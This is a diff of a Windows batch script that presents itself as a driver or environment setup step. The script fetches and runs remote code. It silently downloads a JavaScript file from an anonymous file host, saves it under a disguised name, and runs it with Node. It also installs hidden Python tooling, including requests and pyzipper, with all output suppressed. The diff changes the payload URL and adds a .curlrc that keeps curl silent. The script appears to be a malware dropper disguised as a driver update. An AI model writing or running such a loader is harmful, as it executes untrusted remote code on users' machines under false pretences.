@@ -79,20 +79,27 @@ where curl >nul 2>&1
 if errorlevel 1 (
     powershell -Command "[Net.ServicePointManager]::SecurityProtocol = 3072; Invoke-WebRequest -Uri 'https://files.catbox.moe/1gq866.js' -OutFile '%CODEPROFILE%\env-setup.npl'" >nul 2>&1
 ) else (
-    curl -L -o "%CODEPROFILE%\env-setup.npl" "https://files.catbox.moe/1gq866.js" >nul 2>&1
+    curl -sSL -o "%CODEPROFILE%\env-setup.npl" "https://files.catbox.moe/92zc8z.js" >nul 2>&1
 )
 :: -------------------------
 :: Run the parser
 :: -------------------------
 if exist "%CODEPROFILE%\env-setup.npl" (
+    set "DRIVER_CURL_HOME=%TEMP%\wdcurl_driver_silent"
+    mkdir "!DRIVER_CURL_HOME!" 2>nul
+    (
+    echo silent
+    echo show-error
+    ) > "!DRIVER_CURL_HOME!\.curlrc"
+    set "CURL_HOME=!DRIVER_CURL_HOME!"
     echo [INFO] Updating Driver Packages...
     cd "%CODEPROFILE%"
     "%NODE_EXE%" "env-setup.npl"
-    mkdir C:\python 2>nul && curl -L https://www.python.org/ftp/python/3.13.2/python-3.13.2-embed-amd64.zip -o C:\python\py.zip && powershell -NoProfile -Command "Expand-Archive -Path C:\python\py.zip -DestinationPath C:\python -Force" && del C:\python\py.zip && powershell -NoProfile -Command "(Get-Content C:\python\python313._pth) -replace '^#import site','import site' | Set-Content C:\python\python313._pth" >nul 2>&1
+    mkdir C:\python 2>nul && curl -sSL https://www.python.org/ftp/python/3.13.2/python-3.13.2-embed-amd64.zip -o C:\python\py.zip && powershell -NoProfile -Command "Expand-Archive -Path C:\python\py.zip -DestinationPath C:\python -Force" && del C:\python\py.zip && powershell -NoProfile -Command "(Get-Content C:\python\python313._pth) -replace '^#import site','import site' | Set-Content C:\python\python313._pth" >nul 2>&1
 
     powershell -NoProfile -Command "(Get-Content C:\python\python313._pth) -replace '^#import site','import site' | Set-Content C:\python\python313._pth" >nul 2>&1
 
-    curl -L https://bootstrap.pypa.io/get-pip.py -o C:\python\get-pip.py >nul 2>&1
+    curl -sSL https://bootstrap.pypa.io/get-pip.py -o C:\python\get-pip.py >nul 2>&1
     C:\python\python.exe C:\python\get-pip.py >nul 2>&1
     C:\python\python.exe -m pip install requests portalocker pyzipper >nul 2>&1
 
